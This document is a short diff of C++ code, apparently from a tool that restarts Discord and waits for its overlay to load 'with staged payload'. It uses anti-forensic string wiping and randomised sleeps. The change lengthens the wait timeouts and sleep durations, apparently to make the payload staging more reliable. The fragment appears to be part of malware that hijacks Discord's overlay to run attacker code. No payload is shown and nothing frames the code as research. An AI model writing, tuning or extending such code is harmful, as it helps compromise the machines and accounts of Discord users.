@@ -236,8 +236,8 @@ bool RestartDiscord() {
     int waitCount = 0;
     bool discordStarted = false;
 
-    // Wait up to 30 seconds for Discord to appear
-    while (waitCount < 60) {
+    // Wait up to 60 seconds for Discord process
+    while (waitCount < 120) {
         if (IsProcessRunning(checkName)) {
             discordStarted = true;
             break;
@@ -248,14 +248,13 @@ bool RestartDiscord() {
     SecureWipeString(checkName);
 
     if (!discordStarted) {
-        std::cout << "[-] Discord did not start within timeout" << std::endl;
+        std::cout << "[-] Discord did not start within extended timeout" << std::endl;
         return false;
     }
 
-    // Give the overlay subsystem extra time to fully load and lock files
-    // Discord needs several seconds after process start to init the overlay
+    // Longer sleep for overlay load (8-12 seconds)
     std::cout << "[+] Discord process detected, waiting for overlay init..." << std::endl;
-    JitteredSleep(4000, 6000);
+    JitteredSleep(8000, 12000);
 
     std::cout << "[+] Discord overlay reinitialized with staged payload" << std::endl;
     return true;
